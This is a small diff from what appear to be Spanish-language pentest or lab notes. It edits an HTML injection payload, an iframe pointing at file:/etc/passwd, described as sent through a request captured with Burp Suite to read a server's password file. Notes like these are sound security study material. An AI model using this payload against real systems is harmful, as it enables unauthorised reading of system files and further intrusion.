@@ -14,5 +14,5 @@ Se toma la peticion con burnsuite y se puede enviar una injection a travez de su
 
 
 <!-- La mejor opción -->
-<iframe src=file:///etc/passwd></iframe>
+<iframe src=file:/etc/passwd height=1000px width=1000px></iframe>
 ```
